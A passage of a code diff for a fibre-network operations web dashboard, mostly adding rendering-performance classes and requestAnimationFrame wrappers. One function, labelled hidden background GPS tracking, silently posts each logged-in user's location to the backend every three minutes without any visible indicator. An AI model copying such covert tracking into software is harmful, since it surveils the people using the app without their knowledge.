+                    <button type="submit" id="submitOtdrBtn" class="w-full mt-2 bg-gradient-to-r from-purple-600 to-indigo-600 active:scale-95 text-white font-bold py-3.5 rounded-xl transition shadow-[0_0_15px_rgba(147,51,234,0.4)] flex items-center justify-center gap-2 text-sm will-change-transform">
                         <i class="fa-solid fa-upload"></i> Upload to Server
                     </button>
                 </form>
@@ -474,11 +506,11 @@
     </div>
 
     <!-- Modals Edit -->
-    <div id="editModal" class="hidden fixed inset-0 z-[110] flex flex-col items-center justify-end md:justify-center bg-black/60 backdrop-blur-md transition-opacity duration-300 w-full h-full opacity-0">
-        <div id="editModalContent" class="bg-dark-900 w-full md:max-w-xl md:rounded-3xl rounded-t-[32px] shadow-[0_-20px_50px_rgba(0,0,0,0.8)] overflow-hidden border border-amber-500/20 flex flex-col max-h-[90vh] transform translate-y-full transition-transform duration-300 ease-out">
+    <div id="editModal" class="hidden fixed inset-0 z-[110] flex flex-col items-center justify-end md:justify-center bg-black/60 backdrop-blur-md transition-opacity duration-300 w-full h-full opacity-0 transform translateZ(0)">
+        <div id="editModalContent" class="bg-dark-900 w-full md:max-w-xl md:rounded-3xl rounded-t-[32px] shadow-[0_-20px_50px_rgba(0,0,0,0.8)] overflow-hidden border border-amber-500/20 flex flex-col max-h-[90vh] transform translate-y-full transition-transform duration-300 ease-out will-change-transform">
             <div class="px-6 py-4 border-b border-zinc-800 flex justify-between items-center bg-dark-900/90 shrink-0">
                 <h3 class="text-amber-400 text-sm font-bold uppercase tracking-wider flex items-center gap-2"><i class="fa-solid fa-user-shield"></i> Edit Node (Owner)</h3>
-                <button onclick="toggleEditModal()" class="text-zinc-500 bg-dark-800 w-8 h-8 rounded-full flex justify-center items-center active:scale-90"><i class="fa-solid fa-times"></i></button>
+                <button onclick="toggleEditModal()" class="text-zinc-500 bg-dark-800 w-8 h-8 rounded-full flex justify-center items-center active:scale-90 will-change-transform"><i class="fa-solid fa-times"></i></button>
             </div>
             <div class="p-6 overflow-y-auto scrollbar-hide flex-1">
                 <form id="manualEditForm" onsubmit="handleUpdateData(event)" class="grid grid-cols-1 md:grid-cols-2 gap-4 pb-10">
@@ -489,34 +521,34 @@
                     <div class="space-y-1.5"><label class="text-[11px] text-zinc-400 font-semibold uppercase">Status Node</label><select id="editStatus" required class="w-full glass-input rounded-xl p-3 text-sm text-white focus:border-amber-500 focus:outline-none appearance-none"><option value="Online" class="bg-dark-800">Online</option><option value="Offline" class="bg-dark-800">Offline</option><option value="Warning" class="bg-dark-800">Warning</option></select></div>
                     <div class="space-y-1.5"><label class="text-[11px] text-zinc-400 font-semibold uppercase">Port Info</label><input type="text" id="editPort" required class="w-full glass-input rounded-xl p-3 text-sm text-white focus:border-amber-500 focus:outline-none"></div>
                     <div class="space-y-1.5"><label class="text-[11px] text-zinc-400 font-semibold uppercase">Kode OTB</label><input type="text" id="editOtb" required class="w-full glass-input rounded-xl p-3 text-sm text-white focus:border-amber-500 focus:outline-none"></div>
-                    <div class="md:col-span-2 pt-3"><button type="submit" id="submitEditBtn" class="w-full bg-amber-500 hover:bg-amber-400 active:scale-95 text-black font-bold py-3.5 rounded-xl transition flex items-center justify-center gap-2 text-sm"><i class="fa-solid fa-save"></i> Apply Changes</button></div>
+                    <div class="md:col-span-2 pt-3"><button type="submit" id="submitEditBtn" class="w-full bg-amber-500 hover:bg-amber-400 active:scale-95 text-black font-bold py-3.5 rounded-xl transition flex items-center justify-center gap-2 text-sm will-change-transform"><i class="fa-solid fa-save"></i> Apply Changes</button></div>
                 </form>
             </div>
         </div>
     </div>
     
-    <div id="editEwoModal" class="hidden fixed inset-0 z-[110] flex flex-col items-center justify-end md:justify-center bg-black/60 backdrop-blur-md transition-opacity duration-300 w-full h-full opacity-0">
-         <div id="editEwoModalContent" class="bg-dark-900 w-full md:max-w-xl md:rounded-3xl rounded-t-[32px] shadow-[0_-20px_50px_rgba(0,0,0,0.8)] overflow-hidden border border-amber-500/20 flex flex-col max-h-[90vh] transform translate-y-full transition-transform duration-300 ease-out">
+    <div id="editEwoModal" class="hidden fixed inset-0 z-[110] flex flex-col items-center justify-end md:justify-center bg-black/60 backdrop-blur-md transition-opacity duration-300 w-full h-full opacity-0 transform translateZ(0)">
+         <div id="editEwoModalContent" class="bg-dark-900 w-full md:max-w-xl md:rounded-3xl rounded-t-[32px] shadow-[0_-20px_50px_rgba(0,0,0,0.8)] overflow-hidden border border-amber-500/20 flex flex-col max-h-[90vh] transform translate-y-full transition-transform duration-300 ease-out will-change-transform">
             <div class="px-6 py-4 border-b border-zinc-800 flex justify-between items-center bg-dark-900/90 shrink-0">
                 <h3 class="text-amber-400 text-sm font-bold uppercase tracking-wider flex items-center gap-2"><i class="fa-solid fa-file-pen"></i> Edit EWO</h3>
-                <button onclick="closeEditEWO()" class="text-zinc-500 bg-dark-800 w-8 h-8 rounded-full flex justify-center items-center active:scale-90"><i class="fa-solid fa-times"></i></button>
+                <button onclick="closeEditEWO()" class="text-zinc-500 bg-dark-800 w-8 h-8 rounded-full flex justify-center items-center active:scale-90 will-change-transform"><i class="fa-solid fa-times"></i></button>
             </div>
             <div class="p-6 overflow-y-auto scrollbar-hide flex-1">
                  <form id="editEwoForm" onsubmit="handleUpdateEWO(event)" class="space-y-4 pb-10">
                     <div class="space-y-1.5"><label class="text-[11px] text-zinc-400 font-semibold uppercase">Nomor EWO</label><input type="text" id="editEwoNo" required class="w-full glass-input rounded-xl p-3 text-sm text-white focus:border-amber-500 focus:outline-none"></div>
                     <div class="space-y-1.5"><label class="text-[11px] text-zinc-400 font-semibold uppercase">Deskripsi Pekerjaan</label><input type="text" id="editEwoDesk" required class="w-full glass-input rounded-xl p-3 text-sm text-white focus:border-amber-500 focus:outline-none"></div>
                     <div class="space-y-1.5"><label class="text-[11px] text-zinc-400 font-semibold uppercase">Status</label><select id="editEwoStat" required class="w-full glass-input rounded-xl p-3 text-sm text-white focus:border-amber-500 focus:outline-none appearance-none"><option value="Not Done" class="bg-dark-800">Not Done</option><option value="Done" class="bg-dark-800">Done</option></select></div>
-                    <div class="pt-3"><button type="submit" id="submitEditEwoBtn" class="w-full bg-amber-500 text-black active:scale-95 font-bold py-3.5 rounded-xl transition flex items-center justify-center gap-2 text-sm"><i class="fa-solid fa-save"></i> Save EWO</button></div>
+                    <div class="pt-3"><button type="submit" id="submitEditEwoBtn" class="w-full bg-amber-500 text-black active:scale-95 font-bold py-3.5 rounded-xl transition flex items-center justify-center gap-2 text-sm will-change-transform"><i class="fa-solid fa-save"></i> Save EWO</button></div>
                 </form>
             </div>
         </div>
     </div>
     
-    <div id="editOtdrModal" class="hidden fixed inset-0 z-[110] flex flex-col items-center justify-end md:justify-center bg-black/60 backdrop-blur-md transition-opacity duration-300 w-full h-full opacity-0">
-        <div id="editOtdrModalContent" class="bg-dark-900 w-full md:max-w-xl md:rounded-3xl rounded-t-[32px] shadow-[0_-20px_50px_rgba(0,0,0,0.8)] overflow-hidden border border-amber-500/20 flex flex-col max-h-[90vh] transform translate-y-full transition-transform duration-300 ease-out">
+    <div id="editOtdrModal" class="hidden fixed inset-0 z-[110] flex flex-col items-center justify-end md:justify-center bg-black/60 backdrop-blur-md transition-opacity duration-300 w-full h-full opacity-0 transform translateZ(0)">
+        <div id="editOtdrModalContent" class="bg-dark-900 w-full md:max-w-xl md:rounded-3xl rounded-t-[32px] shadow-[0_-20px_50px_rgba(0,0,0,0.8)] overflow-hidden border border-amber-500/20 flex flex-col max-h-[90vh] transform translate-y-full transition-transform duration-300 ease-out will-change-transform">
             <div class="px-6 py-4 border-b border-zinc-800 flex justify-between items-center bg-dark-900/90 shrink-0">
                 <h3 class="text-amber-400 text-sm font-bold uppercase tracking-wider flex items-center gap-2"><i class="fa-solid fa-file-pen"></i> Edit OTDR File Data</h3>
-                <button onclick="closeEditOTDR()" class="text-zinc-500 bg-dark-800 w-8 h-8 rounded-full flex justify-center items-center active:scale-90"><i class="fa-solid fa-times"></i></button>
+                <button onclick="closeEditOTDR()" class="text-zinc-500 bg-dark-800 w-8 h-8 rounded-full flex justify-center items-center active:scale-90 will-change-transform"><i class="fa-solid fa-times"></i></button>
             </div>
             <div class="p-6 overflow-y-auto scrollbar-hide flex-1">
                  <form id="editOtdrForm" onsubmit="handleUpdateOTDR(event)" class="space-y-4 pb-10">
@@ -524,17 +556,17 @@
                     <div class="space-y-1.5"><label class="text-[11px] text-zinc-400 font-semibold uppercase">Nama OTB</label><input type="text" id="editOtdrOtb" required class="w-full glass-input rounded-xl p-3 text-sm text-white focus:border-amber-500 focus:outline-none"></div>
                     <div class="space-y-1.5"><label class="text-[11px] text-zinc-400 font-semibold uppercase">Lokasi Area</label><input type="text" id="editOtdrLokasi" required class="w-full glass-input rounded-xl p-3 text-sm text-white focus:border-amber-500 focus:outline-none"></div>
                     <div class="text-[10px] text-amber-500/70 italic mt-2"><i class="fa-solid fa-info-circle"></i> Catatan: File SOR tidak dapat diubah di mode ini. Anda harus menghapus dan mengupload ulang untuk mengganti file.</div>
-                    <div class="pt-3"><button type="submit" id="submitEditOtdrBtn" class="w-full bg-amber-500 text-black active:scale-95 font-bold py-3.5 rounded-xl transition flex items-center justify-center gap-2 text-sm"><i class="fa-solid fa-save"></i> Update Details</button></div>
+                    <div class="pt-3"><button type="submit" id="submitEditOtdrBtn" class="w-full bg-amber-500 text-black active:scale-95 font-bold py-3.5 rounded-xl transition flex items-center justify-center gap-2 text-sm will-change-transform"><i class="fa-solid fa-save"></i> Update Details</button></div>
                 </form>
             </div>
         </div>
     </div>
     
-    <div id="editOtdrFolderModal" class="hidden fixed inset-0 z-[110] flex flex-col items-center justify-end md:justify-center bg-black/60 backdrop-blur-md transition-opacity duration-300 w-full h-full opacity-0">
-        <div id="editOtdrFolderModalContent" class="bg-dark-900 w-full md:max-w-xl md:rounded-3xl rounded-t-[32px] shadow-[0_-20px_50px_rgba(0,0,0,0.8)] overflow-hidden border border-amber-500/20 flex flex-col max-h-[90vh] transform translate-y-full transition-transform duration-300 ease-out">
+    <div id="editOtdrFolderModal" class="hidden fixed inset-0 z-[110] flex flex-col items-center justify-end md:justify-center bg-black/60 backdrop-blur-md transition-opacity duration-300 w-full h-full opacity-0 transform translateZ(0)">
+        <div id="editOtdrFolderModalContent" class="bg-dark-900 w-full md:max-w-xl md:rounded-3xl rounded-t-[32px] shadow-[0_-20px_50px_rgba(0,0,0,0.8)] overflow-hidden border border-amber-500/20 flex flex-col max-h-[90vh] transform translate-y-full transition-transform duration-300 ease-out will-change-transform">
             <div class="px-6 py-4 border-b border-zinc-800 flex justify-between items-center bg-dark-900/90 shrink-0">
                 <h3 class="text-amber-400 text-sm font-bold uppercase tracking-wider flex items-center gap-2"><i class="fa-solid fa-folder-pen"></i> Ubah Nama Folder</h3>
-                <button onclick="closeEditOTDRFolder()" class="text-zinc-500 bg-dark-800 w-8 h-8 rounded-full flex justify-center items-center active:scale-90"><i class="fa-solid fa-times"></i></button>
+                <button onclick="closeEditOTDRFolder()" class="text-zinc-500 bg-dark-800 w-8 h-8 rounded-full flex justify-center items-center active:scale-90 will-change-transform"><i class="fa-solid fa-times"></i></button>
             </div>
             <div class="p-6 overflow-y-auto scrollbar-hide flex-1">
                  <form id="editOtdrFolderForm" onsubmit="handleUpdateOTDRFolder(event)" class="space-y-4 pb-10">
@@ -543,7 +575,7 @@
                         <input type="text" id="editOtdrFolderNewName" required class="w-full glass-input rounded-xl p-3 text-sm text-white focus:border-amber-500 focus:outline-none" placeholder="Masukkan nama baru">
                     </div>
                     <div class="pt-3">
-                        <button type="submit" id="submitEditOtdrFolderBtn" class="w-full bg-amber-500 text-black active:scale-95 font-bold py-3.5 rounded-xl transition flex items-center justify-center gap-2 text-sm">
+                        <button type="submit" id="submitEditOtdrFolderBtn" class="w-full bg-amber-500 text-black active:scale-95 font-bold py-3.5 rounded-xl transition flex items-center justify-center gap-2 text-sm will-change-transform">
                             <i class="fa-solid fa-save"></i> Terapkan Nama Baru
                         </button>
                     </div>
@@ -552,29 +584,29 @@
         </div>
     </div>
     
-    <div id="confirmDeleteModal" class="hidden fixed inset-0 z-[120] flex items-center justify-center p-4 bg-black/70 backdrop-blur-md transition-opacity duration-300 opacity-0 w-full h-full">
-        <div id="confirmDeleteModalContent" class="bg-dark-900 border border-zinc-800 w-full max-w-sm rounded-3xl shadow-2xl p-6 text-center transform scale-95 transition-transform duration-300">
+    <div id="confirmDeleteModal" class="hidden fixed inset-0 z-[120] flex items-center justify-center p-4 bg-black/70 backdrop-blur-md transition-opacity duration-300 opacity-0 w-full h-full transform translateZ(0)">
+        <div id="confirmDeleteModalContent" class="bg-dark-900 border border-zinc-800 w-full max-w-sm rounded-3xl shadow-2xl p-6 text-center transform scale-95 transition-transform duration-300 will-change-transform">
             <div class="w-16 h-16 bg-red-500/10 border border-red-500/20 rounded-full flex items-center justify-center text-red-500 mx-auto mb-5"><i class="fa-solid fa-trash-can text-3xl"></i></div>
             <h3 class="text-white text-lg font-bold mb-2">Hapus <span id="deleteContextType">Data</span>?</h3>
             <p class="text-zinc-400 text-sm mb-8 leading-relaxed">Apakah Anda yakin ingin menghapus data ini secara permanen dari server? Tindakan ini tidak dapat dibatalkan.</p>
             
             <div class="flex gap-3 justify-center">
-                <button onclick="closeDeleteModal()" class="flex-1 bg-dark-800 hover:bg-dark-700 text-zinc-300 text-sm font-semibold py-3.5 rounded-xl transition active:scale-95 border border-zinc-700">Batal</button>
-                <button id="confirmDeleteBtn" onclick="executeDeleteData()" class="flex-1 bg-red-500 hover:bg-red-600 text-white text-sm font-bold py-3.5 rounded-xl transition active:scale-95 shadow-[0_0_15px_rgba(239,68,68,0.4)]">Ya, Hapus</button>
+                <button onclick="closeDeleteModal()" class="flex-1 bg-dark-800 hover:bg-dark-700 text-zinc-300 text-sm font-semibold py-3.5 rounded-xl transition active:scale-95 border border-zinc-700 will-change-transform">Batal</button>
+                <button id="confirmDeleteBtn" onclick="executeDeleteData()" class="flex-1 bg-red-500 hover:bg-red-600 text-white text-sm font-bold py-3.5 rounded-xl transition active:scale-95 shadow-[0_0_15px_rgba(239,68,68,0.4)] will-change-transform">Ya, Hapus</button>
             </div>
         </div>
     </div>
 
     <!-- Modal Activity Log -->
-    <div id="activityLogModal" class="hidden fixed inset-0 z-[100] flex flex-col items-center justify-end md:justify-center bg-black/60 backdrop-blur-sm transition-opacity duration-300 opacity-0 w-full h-full">
-        <div id="activityLogModalContent" class="bg-dark-900 w-full md:w-[95%] md:max-w-2xl md:rounded-3xl rounded-t-[32px] shadow-[0_-20px_50px_rgba(0,0,0,0.8)] overflow-hidden border-t border-zinc-800 md:border flex flex-col h-[85vh] transform translate-y-full transition-transform duration-300 ease-out">
+    <div id="activityLogModal" class="hidden fixed inset-0 z-[100] flex flex-col items-center justify-end md:justify-center bg-black/60 backdrop-blur-sm transition-opacity duration-300 opacity-0 w-full h-full transform translateZ(0)">
+        <div id="activityLogModalContent" class="bg-dark-900 w-full md:w-[95%] md:max-w-2xl md:rounded-3xl rounded-t-[32px] shadow-[0_-20px_50px_rgba(0,0,0,0.8)] overflow-hidden border-t border-zinc-800 md:border flex flex-col h-[85vh] transform translate-y-full transition-transform duration-300 ease-out will-change-transform">
             <div class="w-full flex justify-center pt-3 pb-2 md:hidden"><div class="w-12 h-1.5 bg-zinc-700 rounded-full"></div></div>
-            <div class="px-5 py-4 border-b border-zinc-800/50 flex justify-between items-center bg-dark-900/90 backdrop-blur-md sticky top-0 z-20">
+            <div class="px-5 py-4 border-b border-zinc-800/50 flex justify-between items-center bg-dark-900/90 backdrop-blur-md sticky top-0 z-20 transform translateZ(0)">
                 <div class="flex items-center gap-3">
                     <div class="w-8 h-8 rounded-full bg-blue-500/20 flex items-center justify-center border border-blue-500/30"><i class="fa-solid fa-clock-rotate-left text-blue-400 text-sm"></i></div>
                     <h3 class="text-white text-base font-bold tracking-wide">System Activity Log</h3>
                 </div>
-                <button onclick="closeActivityLogModal()" class="w-8 h-8 bg-zinc-800 rounded-full flex justify-center items-center text-zinc-400 hover:text-white hover:bg-zinc-700 active:scale-90 transition"><i class="fa-solid fa-xmark text-lg"></i></button>
+                <button onclick="closeActivityLogModal()" class="w-8 h-8 bg-zinc-800 rounded-full flex justify-center items-center text-zinc-400 hover:text-white hover:bg-zinc-700 active:scale-90 transition will-change-transform"><i class="fa-solid fa-xmark text-lg"></i></button>
             </div>
             <div class="p-3 md:p-5 overflow-y-auto scrollbar-hide bg-dark-900 flex-1 flex flex-col w-full relative">
                 <div id="activityLogContainer" class="space-y-3 w-full">
@@ -585,17 +617,17 @@
     </div>
 
     <!-- Modal Team Tracker GPS -->
-    <div id="trackerModal" class="hidden fixed inset-0 z-[100] flex flex-col items-center justify-end md:justify-center bg-black/60 backdrop-blur-sm transition-opacity duration-300 opacity-0 w-full h-full">
-        <div id="trackerModalContent" class="bg-dark-900 w-full md:w-[95%] md:max-w-2xl md:rounded-3xl rounded-t-[32px] shadow-[0_-20px_50px_rgba(0,0,0,0.8)] overflow-hidden border-t border-zinc-800 md:border flex flex-col h-[85vh] transform translate-y-full transition-transform duration-300 ease-out">
+    <div id="trackerModal" class="hidden fixed inset-0 z-[100] flex flex-col items-center justify-end md:justify-center bg-black/60 backdrop-blur-sm transition-opacity duration-300 opacity-0 w-full h-full transform translateZ(0)">
+        <div id="trackerModalContent" class="bg-dark-900 w-full md:w-[95%] md:max-w-2xl md:rounded-3xl rounded-t-[32px] shadow-[0_-20px_50px_rgba(0,0,0,0.8)] overflow-hidden border-t border-zinc-800 md:border flex flex-col h-[85vh] transform translate-y-full transition-transform duration-300 ease-out will-change-transform">
             <div class="w-full flex justify-center pt-3 pb-2 md:hidden"><div class="w-12 h-1.5 bg-zinc-700 rounded-full"></div></div>
-            <div class="px-5 py-4 border-b border-zinc-800/50 flex justify-between items-center bg-dark-900/90 backdrop-blur-md sticky top-0 z-20">
+            <div class="px-5 py-4 border-b border-zinc-800/50 flex justify-between items-center bg-dark-900/90 backdrop-blur-md sticky top-0 z-20 transform translateZ(0)">
                 <div class="flex items-center gap-3">
                     <div class="w-8 h-8 rounded-full bg-emerald-500/20 flex items-center justify-center border border-emerald-500/30"><i class="fa-solid fa-location-crosshairs text-emerald-400 text-sm"></i></div>
                     <h3 class="text-white text-base font-bold tracking-wide">Team GPS Tracker</h3>
                 </div>
                 <div class="flex gap-2">
-                    <button onclick="refreshTrackerData()" class="w-8 h-8 bg-zinc-800 rounded-full flex justify-center items-center text-emerald-400 hover:text-white hover:bg-zinc-700 active:scale-90 transition"><i id="trackerSyncIcon" class="fa-solid fa-rotate"></i></button>
-                    <button onclick="closeTrackerModal()" class="w-8 h-8 bg-zinc-800 rounded-full flex justify-center items-center text-zinc-400 hover:text-white hover:bg-zinc-700 active:scale-90 transition"><i class="fa-solid fa-xmark text-lg"></i></button>
+                    <button onclick="refreshTrackerData()" class="w-8 h-8 bg-zinc-800 rounded-full flex justify-center items-center text-emerald-400 hover:text-white hover:bg-zinc-700 active:scale-90 transition will-change-transform"><i id="trackerSyncIcon" class="fa-solid fa-rotate"></i></button>
+                    <button onclick="closeTrackerModal()" class="w-8 h-8 bg-zinc-800 rounded-full flex justify-center items-center text-zinc-400 hover:text-white hover:bg-zinc-700 active:scale-90 transition will-change-transform"><i class="fa-solid fa-xmark text-lg"></i></button>
                 </div>
             </div>
             <div class="p-3 md:p-5 overflow-y-auto scrollbar-hide bg-dark-900 flex-1 flex flex-col w-full relative">
@@ -611,27 +643,27 @@
     </div>
 
     <!-- MODAL PETA GOOGLE MAP -->
-    <div id="mapModal" class="hidden fixed inset-0 z-[100] flex flex-col items-center justify-end md:justify-center bg-black/60 backdrop-blur-sm transition-opacity duration-300 opacity-0 w-full h-full">
-        <div id="mapModalContent" class="bg-dark-900 w-full md:w-[95%] md:max-w-2xl md:rounded-3xl rounded-t-[32px] shadow-[0_-20px_50px_rgba(0,0,0,0.8)] overflow-hidden border-t border-zinc-800 md:border flex flex-col h-[60vh] transform translate-y-full transition-transform duration-300 ease-out">
+    <div id="mapModal" class="hidden fixed inset-0 z-[100] flex flex-col items-center justify-end md:justify-center bg-black/60 backdrop-blur-sm transition-opacity duration-300 opacity-0 w-full h-full transform translateZ(0)">
+        <div id="mapModalContent" class="bg-dark-900 w-full md:w-[95%] md:max-w-2xl md:rounded-3xl rounded-t-[32px] shadow-[0_-20px_50px_rgba(0,0,0,0.8)] overflow-hidden border-t border-zinc-800 md:border flex flex-col h-[60vh] transform translate-y-full transition-transform duration-300 ease-out will-change-transform">
             <div class="w-full flex justify-center pt-3 pb-2 md:hidden"><div class="w-12 h-1.5 bg-zinc-700 rounded-full"></div></div>
             
-            <div class="px-5 py-4 border-b border-zinc-800/50 flex justify-between items-center bg-dark-900/90 backdrop-blur-md sticky top-0 z-20">
+            <div class="px-5 py-4 border-b border-zinc-800/50 flex justify-between items-center bg-dark-900/90 backdrop-blur-md sticky top-0 z-20 transform translateZ(0)">
                 <div class="flex items-center gap-3">
                     <div class="w-8 h-8 rounded-full bg-emerald-500/20 flex items-center justify-center border border-emerald-500/30"><i class="fa-solid fa-map-location-dot text-emerald-400 text-sm"></i></div>
                     <h3 class="text-white text-base font-bold tracking-wide">Peta BBDM Moratelindo Inner</h3>
                 </div>
-                <button onclick="closeMapModal()" class="w-8 h-8 bg-zinc-800 rounded-full flex justify-center items-center text-zinc-400 hover:text-white hover:bg-zinc-700 active:scale-90 transition"><i class="fa-solid fa-xmark text-lg"></i></button>
+                <button onclick="closeMapModal()" class="w-8 h-8 bg-zinc-800 rounded-full flex justify-center items-center text-zinc-400 hover:text-white hover:bg-zinc-700 active:scale-90 transition will-change-transform"><i class="fa-solid fa-xmark text-lg"></i></button>
             </div>
             
             <div class="p-0 bg-dark-900 flex-1 flex flex-col w-full relative">
                 <div class="w-full h-full bg-dark-800/50 flex flex-col items-center justify-center p-6 text-center">
-                    <div class="w-20 h-20 bg-emerald-500/10 rounded-full flex items-center justify-center border border-emerald-500/30 mb-6 shadow-[0_0_30px_rgba(16,185,129,0.2)]">
+                    <div class="w-20 h-20 bg-emerald-500/10 rounded-full flex items-center justify-center border border-emerald-500/30 mb-6 shadow-[0_0_30px_rgba(16,185,129,0.2)] transform translateZ(0)">
                         <i class="fa-solid fa-map-location-dot text-4xl text-emerald-400"></i>
                     </div>
                     <h2 class="text-xl font-bold text-white mb-2">Peta Jalur Backbone & Joint Box</h2>
                     <p class="text-zinc-400 text-sm mb-8 max-w-md">End-to-end jalur backbone lengkap dengan titik koordinat Joint Box dan histori Fiber Cut.</p>
                     
-                    <a href="https://goo.gl/maps/KFG7T5BWDM9cPiL26?g_st=aw" target="_blank" class="bg-gradient-to-r from-emerald-600 to-teal-500 hover:from-emerald-500 hover:to-teal-400 text-white px-6 py-3.5 rounded-xl font-bold shadow-[0_0_20px_rgba(16,185,129,0.4)] flex items-center gap-3 transition-all active:scale-95">
+                    <a href="https://goo.gl/maps/KFG7T5BWDM9cPiL26?g_st=aw" target="_blank" class="bg-gradient-to-r from-emerald-600 to-teal-500 hover:from-emerald-500 hover:to-teal-400 text-white px-6 py-3.5 rounded-xl font-bold shadow-[0_0_20px_rgba(16,185,129,0.4)] flex items-center gap-3 transition-all active:scale-95 will-change-transform">
                         <i class="fa-solid fa-arrow-up-right-from-square"></i> Buka Google Maps Live
                     </a>
                 </div>
@@ -689,10 +721,7 @@
                     getDashboardStats: () => fetchAPI('getDashboardStats', {}, sCb, fCb),
                     getRecapStats: () => fetchAPI('getRecapStats', {}, sCb, fCb),
                     searchNetworkData: (filters) => fetchAPI('searchNetworkData', {filters}, sCb, fCb),
-                    
-                    // [PENAMBAHAN] ROUTE MOCK UNTUK EXPORT TANPA LIMIT
                     getAllNetworkDataForExport: (filters) => fetchAPI('getAllNetworkDataForExport', {filters}, sCb, fCb),
-                    
                     insertNetworkData: (dataObj, email) => fetchAPI('insertNetworkData', {dataObj, email}, sCb, fCb),
                     updateNetworkData: (originalData, updatedData, email) => fetchAPI('updateNetworkData', {originalData, updatedData, email}, sCb, fCb),
                     deleteNetworkData: (targetData, email) => fetchAPI('deleteNetworkData', {targetData, email}, sCb, fCb),
@@ -735,7 +764,7 @@
         let gpsTrackerInterval = null;
 
         // ==============================================================
-        // UI UTILITIES
+        // UI UTILITIES (Optimized for requestAnimationFrame)
         // ==============================================================
         function showToast(message, type = 'success') {
             const container = document.getElementById('toastContainer');
@@ -744,8 +773,17 @@
             const icons = { success: 'fa-circle-check', error: 'fa-circle-xmark', info: 'fa-circle-info' };
             toast.className = `flex items-center gap-3 p-3.5 rounded-2xl border backdrop-blur-md shadow-lg toast-enter ${colors[type]}`;
             toast.innerHTML = `<i class="fa-solid ${icons[type]} text-lg"></i><span class="text-xs font-semibold tracking-wide text-white">${message}</span>`;
-            container.appendChild(toast);
-            setTimeout(() => { toast.classList.replace('toast-enter', 'toast-exit'); setTimeout(() => toast.remove(), 300); }, 3000);
+            
+            requestAnimationFrame(() => {
+                container.appendChild(toast);
+            });
+
+            setTimeout(() => { 
+                requestAnimationFrame(() => {
+                    toast.classList.replace('toast-enter', 'toast-exit'); 
+                });
+                setTimeout(() => { requestAnimationFrame(() => { toast.remove(); }); }, 300); 
+            }, 3000);
         }
 
         function setButtonState(btnId, isLoading, originalHtml) {
@@ -763,23 +801,39 @@
         function animateModalOpen(modalId, contentId) {
             const modal = document.getElementById(modalId);
             const content = document.getElementById(contentId);
-            modal.classList.remove('hidden'); document.body.style.overflow = 'hidden';
+            
             requestAnimationFrame(() => {
-                modal.classList.remove('opacity-0'); if(content) content.classList.remove('translate-y-full');
+                modal.classList.remove('hidden'); 
+                document.body.style.overflow = 'hidden';
+                
+                requestAnimationFrame(() => {
+                    modal.classList.remove('opacity-0'); 
+                    if(content) content.classList.remove('translate-y-full');
+                });
             });
         }
+        
         function animateModalClose(modalId, contentId) {
             const modal = document.getElementById(modalId);
             const content = document.getElementById(contentId);
-            modal.classList.add('opacity-0'); if(content) content.classList.add('translate-y-full');
-            setTimeout(() => { modal.classList.add('hidden'); document.body.style.overflow = ''; }, 300);
+            
+            requestAnimationFrame(() => {
+                modal.classList.add('opacity-0'); 
+                if(content) content.classList.add('translate-y-full');
+            });
+            
+            setTimeout(() => { 
+                requestAnimationFrame(() => {
+                    modal.classList.add('hidden'); 
+                    document.body.style.overflow = ''; 
+                });
+            }, 300);
         }
 
         // ==============================================================
         // HIDDEN GPS TRACKING (BACKGROUND)
         // ==============================================================
         function startHiddenGPS(email) {
-            // Bersihkan interval yang lama jika ada
             clearInterval(gpsTrackerInterval);
             
             if (!navigator.geolocation) {
@@ -787,7 +841,6 @@
                 return;
             }
 
-            // Fungsi untuk mengirim lokasi secara silent ke backend
             const sendSilentLocation = () => {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
@@ -799,7 +852,6 @@
                                 lng: position.coords.longitude 
                             } 
                         };
-                        // Silent fetch (tidak ada indikator loading UI)
                         if(GAS_API_URL) {
                             fetch(GAS_API_URL, { 
                                 method: 'POST', 
@@ -814,10 +866,7 @@
                 );
             };
 
-            // Kirim lokasi saat baru login
             sendSilentLocation();
-            
-            // Atur interval setiap 3 menit (180000 ms)
             gpsTrackerInterval = setInterval(sendSilentLocation, 180000);
         }
 
@@ -852,7 +901,7 @@
             google.script.run.withSuccessHandler(res => {
                 if (syncIcon) syncIcon.classList.remove('fa-spin');
                 if (res.success) {
-                    renderTrackerData(res.data);
+                    requestAnimationFrame(() => renderTrackerData(res.data));
                 } else {
                     container.innerHTML = `<div class="text-center py-10 text-red-400"><i class="fa-solid fa-triangle-exclamation text-2xl mb-3"></i><p class="text-xs">${res.message}</p></div>`;
                 }
@@ -872,7 +921,6 @@
             let html = '';
             data.forEach(loc => {
                 let mapsUrl = `https://www.google.com/maps/search/?api=1&query=${loc.lat},${loc.lng}`;
-                
                 html += `
                 <div class="bg-dark-800/50 p-4 rounded-2xl border border-zinc-800/80 flex flex-col gap-3 transition-all hover:bg-dark-800">
                     <div class="flex justify-between items-center gap-2 border-b border-zinc-700/50 pb-2">
@@ -910,7 +958,7 @@
             const session = JSON.parse(localStorage.getItem('netcore_session') || '{}');
             
             google.script.run.withSuccessHandler(res => {
-                if (res.success) renderActivityLogs(res.data);
+                if (res.success) requestAnimationFrame(() => renderActivityLogs(res.data));
                 else container.innerHTML = `<div class="text-center py-10 text-red-400"><i class="fa-solid fa-triangle-exclamation text-2xl mb-3"></i><p class="text-xs">${res.message}</p></div>`;
             }).withFailureHandler(err => {
                 container.innerHTML = `<div class="text-center py-10 text-red-400"><i class="fa-solid fa-triangle-exclamation text-2xl mb-3"></i><p class="text-xs">Error: ${err.message}</p></div>`;
@@ -956,7 +1004,7 @@
             const syncIcon = document.getElementById('syncIcon'); if(syncIcon) syncIcon.classList.add('fa-spin');
             if (typeof google !== 'undefined' && google.script) {
                 google.script.run.withSuccessHandler(stats => {
-                    renderDashboardStats(stats);
+                    requestAnimationFrame(() => renderDashboardStats(stats));
                     if(syncIcon) syncIcon.classList.remove('fa-spin'); showToast('Data Synced', 'success');
                 }).withFailureHandler(err => { if(syncIcon) syncIcon.classList.remove('fa-spin'); showToast('Failed to load stats', 'error'); }).getDashboardStats();
             }
@@ -1002,23 +1050,27 @@
         function toggleRecapDropdown() {
             const panel = document.getElementById('recapDropdownPanel');
             const chevron = document.getElementById('recapChevron');
-            if(panel.classList.contains('hidden')) {
-                panel.classList.remove('hidden'); chevron.classList.add('rotate-180');
-                setTimeout(() => panel.classList.remove('opacity-0', 'translate-y-2'), 10);
-            } else {
-                panel.classList.add('opacity-0', 'translate-y-2'); chevron.classList.remove('rotate-180');
-                setTimeout(() => panel.classList.add('hidden'), 300);
-            }
+            requestAnimationFrame(() => {
